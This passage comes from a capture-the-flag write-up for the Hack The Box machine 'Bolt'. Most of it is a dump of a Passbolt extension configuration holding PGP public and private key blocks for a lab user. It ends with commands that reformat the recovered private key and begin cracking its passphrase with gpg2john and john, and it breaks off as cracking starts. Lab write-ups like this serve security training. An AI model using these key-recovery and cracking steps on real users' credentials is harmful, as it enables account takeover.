xZ\\r\\n-----END PGP PRIVATE KEY BLOCK-----\\r\\n\",\"keyId\":\"dc3b4abd\",\"userIds\":[{\"name\":\"Eddie Johnson\",\"email\":\"eddie@bolt.htb\"}],\"fingerprint\":\"df426bc7a4a8af58e50eda0e1c2741a3dc3b4abd\",\"created\":\"Thu Feb 25 2021 14:49:21 GMT-0700 (Mountain Standard Time)\",\"expires\":\"Never\",\"algorithm\":\"rsa_encrypt_sign\",\"length\":2048,\"private\":true,\"user_id\":\"MY_KEY_ID\"}}",
   "passbolt-public-gpgkeys":"{\"ba192ac8-99c0-3c89-a36f-a6094f5b9391\":{\"key\":\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxsDNBGA2peUBDADHDueSrCzcZBMgt9GzuI4x57F0Pw922++n/vQ5rQs0A3Cm\\r\\nof6BH+H3sJkXIVlvLF4pygGyYndMMQT3NxZ84q32dPp2DKDipD8gA4ep9RAT\\r\\nIC4seXLUSTgRlxjB//NZNrAv35cHjb8f2hutHGYdigUUjB7SGzkjHtd7Ixbk\\r\\nLxxRta8tp9nLkqhrPkGCZRhJQPoolQQec2HduK417aBXHRxOLi6Loo2DXPRm\\r\\nDAqqYIhP9Nkhy27wL1zz57Fi0nyPBWTqA/WAEbx+ud575cJKHM7riAaLaK0s\\r\\nhuN12qJ7vEALjWY2CppEr04PLgQ5pj48Asly4mfcpzztP2NdQfZrFHe/JYwH\\r\\nI0zLDA4ZH4E/NK7HhPWovpF5JNK10tI16hTmzkK0mZVs8rINuB1b0uB0u3FP\\r\\n4oXfBuo6V5HEhZQ/H+YKyxG8A3xNsMTW4sy+JOw3EnJQT3O4S/ZR14+42nNt\\r\\nP+PbpxTgChS0YoLkRmYVikfFZeMgWl2L8MyqbXhvQlKb/PMAEQEAAc0kUGFz\\r\\nc2JvbHQgU2VydmVyIEtleSA8YWRtaW5AYm9sdC5odGI+wsElBBMBCgA4FiEE\\r\\nWYYKJp6AP6CUQWdTq44u+1ahbIQFAmA2peUCGwMFCwkIBwIGFQoJCAsCBBYC\\r\\nAwECHgECF4AAIQkQq44u+1ahbIQWIQRZhgomnoA/oJRBZ1Orji77VqFshPZa\\r\\nDACcb7OIZ5YTrRCeMrB/QRXwiS8p1SBHWZbzCwVTdryTH+9d2qKuk9cUF90I\\r\\ngTDNDwgWhcR+NAcHvXVdp3oVs4ppR3+RrGwA0YqVUuRogyKzVvtZKWBgwnJj\\r\\nULJiBG2OkxXzrY9N/4hCHJMliI9L4yjf0gOeNqQa9fVPk8C73ctKglu75ufe\\r\\nxTLxHuQc021HMWmQt+IDanaAY6aEKF0b1L49XuLe3rWpWXmovAc6YuJBkpGg\\r\\na/un/1IAk4Ifw1+fgBoGSQEaucgzSxy8XimUjv9MVNX01P/C9eU/149QW5r4\\r\\naNtabc2S8/TDDVEzAUzgwLHihQyzetS4+Qw9tbAQJeC6grfKRMSt3LCx1sX4\\r\\nP0jFHFPVLXAOtOiCUAK572iD2lyJdDsLs1dj4H/Ix2AV/UZe/G0qpN9oo/I+\\r\\nvC86HzDdK2bPu5gMHzZDI30vBCZR+S68sZSBefpjWeLWaGdtfdfK0/hYnDIP\\r\\neTLXDwBpLFklKpyi2HwnHYwB7YX/RiWgBffOwM0EYDal5QEMAJJNskp8LuSU\\r\\n3YocqmdLi9jGBVoSSzLLpeGt5HifVxToToovv1xP5Yl7MfqPdVkqCIbABNnm\\r\\noIMj7mYpjXfp659FGzzV0Ilr0MwK0sFFllVsH6beaScKIHCQniAjfTqCMuIb\\r\\n3otbqxakRndrFI1MNHURHMpp9gc2giY8Y8OsjAfkLeTHgQbBs9SqVbQYK0d1\\r\\njTKfAgYRkjzvp6mbLMaMA3zE9joa+R0XFFZlbcDR1tBPkj9eGK0OM1SMkU/p\\r\\nxTx6gyZdVYfV10n41SJMUF/Nir5tN1fwgbhSoMTSCm6zuowNU70+VlMx4TuZ\\r\\nRkXI2No3mEFzkw1sg/U3xH5ZlU/BioNhizJefn28kmF+801lBDMCsiRpW1i8\\r\\ncnr5U2D5QUzdj8I1G8xkoC6S6GryOeccJwQkwI9SFtaDQQQLI0b3F6wV32fE\\r\\n21nq2dek7/hocGpoxIYwOJRkpkw9tK2g8betT4OjHmVkiPnoyWo9do8g0Bzd\\r\\nNBUlP7GHXM/t605MdK9ZMQARAQABwsENBBgBCgAgFiEEWYYKJp6AP6CUQWdT\\r\\nq44u+1ahbIQFAmA2peUCGwwAIQkQq44u+1ahbIQWIQRZhgomnoA/oJRBZ1Or\\r\\nji77VqFshCbkC/9mKoWGFEGCbgdMX3+yiEKHscumFvmd1BABdc+BLZ8RS2D4\\r\\ndvShUdw+gf3m0Y9O16oQ/a2kDQywWDBC9kp3ByuRsphu7WnvVSh5PM0quwCK\\r\\nHmO+DwPJyw7Ji+ESRRCyPIIZImZrPYyBsJtmVVpjq323yEuWBB1l5NyflL5I\\r\\nLs9kncyEc7wNb5p1PEsui/Xv7N5HRocp1ni1w5k66BjKwMGnc48+x1nGPaP0\\r\\n4LYAjomyQpRLxFucKtx8UTa26bWWe59BSMGjND8cGdi3FiWBPmaSzp4+E1r0\\r\\nAJ2SHGJEZJXIeyASrWbvXMByxrVGgXBR6NHfl5e9rGDZcwo0R8LbbuACf7/F\\r\\nsRIKSwmIaLpmsTgEW9d8FdjM6Enm7nCObJnQOpzzGbHbIMxySaCso/eZDX3D\\r\\nR50E9IFLqf+Au+2UTUhlloPnIEcp7xV75txkLm6YUAhMUyLn51pGsQloUZ6L\\r\\nZ8gbvveCudfCIYF8cZzZbCB3vlVkPOBSl6GwOg9FHAVS0jY=\\r\\n=FBUR\\r\\n-----END PGP PUBLIC KEY BLOCK-----\\r\\n\",\"keyId\":\"56a16c84\",\"userIds\":[{\"name\":\"Passbolt Server Key\",\"email\":\"admin@bolt.htb\"}],\"fingerprint\":\"59860a269e803fa094416753ab8e2efb56a16c84\",\"created\":\"Wed Feb 24 2021 12:15:49 GMT-0700 (Mountain Standard Time)\",\"expires\":\"Never\",\"algorithm\":\"rsa_encrypt_sign\",\"length\":3072,\"private\":false,\"user_id\":\"ba192ac8-99c0-3c89-a36f-a6094f5b9391\"},\"4e184ee6-e436-47fb-91c9-dccb57f250bc\":{\"key\":\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxsBNBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU\\r\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\r\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB\\r\\nAAHNHkVkZGllIEpvaG5zb24gPGVkZGllQGJvbHQuaHRiPsLAjQQQAQgAIAUC\\r\\nYDgbYQYLCQcIAwIEFQgKAgQWAgEAAhkBAhsDAh4BACEJEBwnQaPcO0q9FiEE\\r\\n30Jrx6Sor1jlDtoOHCdBo9w7Sr35DQf9HZOFYE3yug2TuEJY7q9QfwNrWhfJ\\r\\nHmOwdM1kCKV5XnBic356DF/ViT3+pcWfIbWT8giYIZ/2qYfAd74S+gMKBim8\\r\\nwBAH0J7WcnUI+py/zXxapGxBF0ufJtqrHmPaKsNaQVCEV3dDzTqlVRi0vfOD\\r\\nCm6kt3E8f8GPYK9Mh21gPjnhoPE1s23NzmBUiDt6wjZ2dOQ2cVagVnf6PyHM\\r\\nWZLqUm8nQY342t3+AA6SFTw/YpwPPvjtZBBHf95BrSbpCE5Bjar9UyB+14x6\\r\\nOUcWhkJu7QgySrCwAg2aKIBzsfWovcVTe9Rkpq/ty1tYOklT9kn75D9ttDF4\\r\\nU8+Qz61kTICf987ATQRgOBthAQgAmlgcw3DqVzEBa5k9djPsUTJWOKVY5uox\\r\\noBp6X0H9njR9Ufb2XtmxZUUdV/uhtbnM0lSlNkeNNBX4c/Qny88vfkgb66xc\\r\\noOo4q+fNCEZfCmcS2AwMsUlzaPDQjowp4V+mWSc8JXq4GXOd/mrooibtiEdt\\r\\nvK4pzMdvwGCykFqugyRDLksc1hfDYU+s5R42TNiMdW7OwYAplnOjgExOH8f1\\r\\nlXVkqbsq5p54TbHe+0SdlfH5pJf4Gfwqj6dQlkSf3DMeEnByxEZX3imeKGrC\\r\\nUmwLN4NHMeUs5EXuLnufut9aTMhbw/tetTtUXTHFk/zc7EhZDR1d3mkDV83c\\r\\ntEUh6BuElwARAQABwsB2BBgBCAAJBQJgOBthAhsMACEJEBwnQaPcO0q9FiEE\\r\\n30Jrx6Sor1jlDtoOHCdBo9w7Sr3+HQf/Qhrj6znyGkLbj9uUv0S1Q5fFx78z\\r\\n5qEXRe4rvFC3APYE8T5/AzW7XWRJxRxzgDQB5yBRoGEuL49w4/UNwhGUklb8\\r\\nIOuffRTHMPZxs8qVToKoEL/CRpiFHgoqQ9dJPJx1u5vWAX0AdOMvcCcPfVjc\\r\\nPyHN73YWejb7Ji82CNtXZ1g9vO7D49rSgLoSNAKghJIkcG+GeAkhoCeU4BjC\\r\\n/NdSM65Kmps6XOpigRottd7WB+sXpd5wyb+UyptwBsF7AISYycPvStDDQESg\\r\\npmGRRi3bQP6jGo1uP/k9wye/WMD0DrQqxch4lqCDk1n7OFIYlCSBOHU0rE/1\\r\\ntD0sGGFpQMsI+Q==\\r\\n=+pbw\\r\\n-----END PGP PUBLIC KEY BLOCK-----\\r\\n\",\"keyId\":\"dc3b4abd\",\"userIds\":[{\"name\":\"Eddie Johnson\",\"email\":\"eddie@bolt.htb\"}],\"fingerprint\":\"df426bc7a4a8af58e50eda0e1c2741a3dc3b4abd\",\"created\":\"Thu Feb 25 2021 14:49:21 GMT-0700 (Mountain Standard Time)\",\"expires\":\"Never\",\"algorithm\":\"rsa_encrypt_sign\",\"length\":2048,\"private\":false,\"user_id\":\"4e184ee6-e436-47fb-91c9-dccb57f250bc\"}}"
}

{
   "config":{
      "user.firstname":"Eddie",
      "user.id":"4e184ee6-e436-47fb-91c9-dccb57f250bc",
      "user.lastname":"Johnson",
      "user.settings.securityToken.code":"GOZ",
      "user.settings.securityToken.color":"#607d8b",
      "user.settings.securityToken.textColor":"#ffffff",
      "user.settings.trustedDomain":"https://passbolt.bolt.htb",
      "user.username":"eddie@bolt.htb"
   },
   "passbolt-private-gpgkeys":"{\"MY_KEY_ID\":{\"key\":\"-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\n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\\r\\nPSwYYWlAywj5\\r\\n=cqxZ\\r\\n-----END PGP PRIVATE KEY BLOCK-----\\r\\n\",\"keyId\":\"dc3b4abd\",\"userIds\":[{\"name\":\"Eddie Johnson\",\"email\":\"eddie@bolt.htb\"}],\"fingerprint\":\"df426bc7a4a8af58e50eda0e1c2741a3dc3b4abd\",\"created\":\"Thu Feb 25 2021 14:49:21 GMT-0700 (Mountain Standard Time)\",\"expires\":\"Never\",\"algorithm\":\"rsa_encrypt_sign\",\"length\":2048,\"private\":true,\"user_id\":\"MY_KEY_ID\"}}",
   "passbolt-public-gpgkeys":"{\"ba192ac8-99c0-3c89-a36f-a6094f5b9391\":{\"key\":\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\n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\\r\\n=FBUR\\r\\n-----END PGP PUBLIC KEY BLOCK-----\\r\\n\",\"keyId\":\"56a16c84\",\"userIds\":[{\"name\":\"Passbolt Server Key\",\"email\":\"admin@bolt.htb\"}],\"fingerprint\":\"59860a269e803fa094416753ab8e2efb56a16c84\",\"created\":\"Wed Feb 24 2021 12:15:49 GMT-0700 (Mountain Standard Time)\",\"expires\":\"Never\",\"algorithm\":\"rsa_encrypt_sign\",\"length\":3072,\"private\":false,\"user_id\":\"ba192ac8-99c0-3c89-a36f-a6094f5b9391\"},\"4e184ee6-e436-47fb-91c9-dccb57f250bc\":{\"key\":\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxsBNBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU\\r\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\r\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB\\r\\nAAHNHkVkZGllIEpvaG5zb24gPGVkZGllQGJvbHQuaHRiPsLAjQQQAQgAIAUC\\r\\nYDgbYQYLCQcIAwIEFQgKAgQWAgEAAhkBAhsDAh4BACEJEBwnQaPcO0q9FiEE\\r\\n30Jrx6Sor1jlDtoOHCdBo9w7Sr35DQf9HZOFYE3yug2TuEJY7q9QfwNrWhfJ\\r\\nHmOwdM1kCKV5XnBic356DF/ViT3+pcWfIbWT8giYIZ/2qYfAd74S+gMKBim8\\r\\nwBAH0J7WcnUI+py/zXxapGxBF0ufJtqrHmPaKsNaQVCEV3dDzTqlVRi0vfOD\\r\\nCm6kt3E8f8GPYK9Mh21gPjnhoPE1s23NzmBUiDt6wjZ2dOQ2cVagVnf6PyHM\\r\\nWZLqUm8nQY342t3+AA6SFTw/YpwPPvjtZBBHf95BrSbpCE5Bjar9UyB+14x6\\r\\nOUcWhkJu7QgySrCwAg2aKIBzsfWovcVTe9Rkpq/ty1tYOklT9kn75D9ttDF4\\r\\nU8+Qz61kTICf987ATQRgOBthAQgAmlgcw3DqVzEBa5k9djPsUTJWOKVY5uox\\r\\noBp6X0H9njR9Ufb2XtmxZUUdV/uhtbnM0lSlNkeNNBX4c/Qny88vfkgb66xc\\r\\noOo4q+fNCEZfCmcS2AwMsUlzaPDQjowp4V+mWSc8JXq4GXOd/mrooibtiEdt\\r\\nvK4pzMdvwGCykFqugyRDLksc1hfDYU+s5R42TNiMdW7OwYAplnOjgExOH8f1\\r\\nlXVkqbsq5p54TbHe+0SdlfH5pJf4Gfwqj6dQlkSf3DMeEnByxEZX3imeKGrC\\r\\nUmwLN4NHMeUs5EXuLnufut9aTMhbw/tetTtUXTHFk/zc7EhZDR1d3mkDV83c\\r\\ntEUh6BuElwARAQABwsB2BBgBCAAJBQJgOBthAhsMACEJEBwnQaPcO0q9FiEE\\r\\n30Jrx6Sor1jlDtoOHCdBo9w7Sr3+HQf/Qhrj6znyGkLbj9uUv0S1Q5fFx78z\\r\\n5qEXRe4rvFC3APYE8T5/AzW7XWRJxRxzgDQB5yBRoGEuL49w4/UNwhGUklb8\\r\\nIOuffRTHMPZxs8qVToKoEL/CRpiFHgoqQ9dJPJx1u5vWAX0AdOMvcCcPfVjc\\r\\nPyHN73YWejb7Ji82CNtXZ1g9vO7D49rSgLoSNAKghJIkcG+GeAkhoCeU4BjC\\r\\n/NdSM65Kmps6XOpigRottd7WB+sXpd5wyb+UyptwBsF7AISYycPvStDDQESg\\r\\npmGRRi3bQP6jGo1uP/k9wye/WMD0DrQqxch4lqCDk1n7OFIYlCSBOHU0rE/1\\r\\ntD0sGGFpQMsI+Q==\\r\\n=+pbw\\r\\n-----END PGP PUBLIC KEY BLOCK-----\\r\\n\",\"keyId\":\"dc3b4abd\",\"userIds\":[{\"name\":\"Eddie Johnson\",\"email\":\"eddie@bolt.htb\"}],\"fingerprint\":\"df426bc7a4a8af58e50eda0e1c2741a3dc3b4abd\",\"created\":\"Thu Feb 25 2021 14:49:21 GMT-0700 (Mountain Standard Time)\",\"expires\":\"Never\",\"algorithm\":\"rsa_encrypt_sign\",\"length\":2048,\"private\":false,\"user_id\":\"4e184ee6-e436-47fb-91c9-dccb57f250bc\"}}"
}
```

The first private key have some invalid characters, so lets export the last one, format it correctly and write it to a file, `eddie-private.asc`.

```bash
┌──(void㉿void)-[/htb/bolt]
└─$ sed -i 's/\\\\r/\n/g' eddie-private.asc && sed -i 's/\\\\n//g' eddie-private.asc
```

<br>

Loading the Private PGP in the revocery page forwards us to the next step where we are prompted to enter the passphrase. Trying all three previously recovered passwords give nothing however.

![[Pasted image 20211112105222.png]]

---------

<br>

### Step 3

Crack the Private PGP! 

```bash
┌──(void㉿void)-[/htb/bolt]
└─$ gpg2john eddie-private.asc > eddie-private.hash                   

File eddie-private.asc

┌──(void㉿void)-[/htb/bolt]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=gpg eddie-private.hash                                                                   
Using default input encoding: UTF-8
